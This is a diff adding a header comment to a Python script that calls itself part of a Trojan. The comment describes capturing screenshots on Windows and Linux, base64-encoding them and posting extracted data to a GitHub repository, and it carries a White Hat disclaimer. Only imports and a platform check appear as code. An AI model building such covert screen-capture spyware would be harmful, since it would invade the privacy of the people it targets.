@@ -1,5 +1,28 @@
 #!/usr/bin/env python
-
+#################################################################################################
+# Author: Nicholas Fisher
+# Date: March 5th 2024
+# Important Note:
+#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
+# these scripts. They are malicious and should only be used in professionally approved White Hat 
+# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
+# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
+# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
+# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
+# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
+# and if that repository is public, all the extracted data will be available for the whole world to see.
+# Description of Script
+# This script is a Python program designed to capture screenshots on both Windows and Linux operating
+# systems. It utilizes platform detection to choose the appropriate method for taking screenshots 
+# based on the current operating system. On Windows, it utilizes the `win32api`, `win32con`, 
+# `win32gui`, and `win32ui` modules to access the system's screen dimensions and capture the screenshot. 
+# On Linux, it utilizes the `Xlib` library to achieve similar functionality. The script includes 
+# functions to retrieve screen dimensions, capture a screenshot, and encode the resulting image 
+# into base64 format. Users can utilize this script by executing it from the command line, and 
+# an example usage would be running the script directly using a Python interpreter. 
+# The script outputs a screenshot file named 'screenshot.bmp', which can be found in the same 
+# directory as the script execution. This file contains the captured screenshot in bitmap format.
+#################################################################################################
 import platform
 import base64
 if platform.system() == 'Windows':
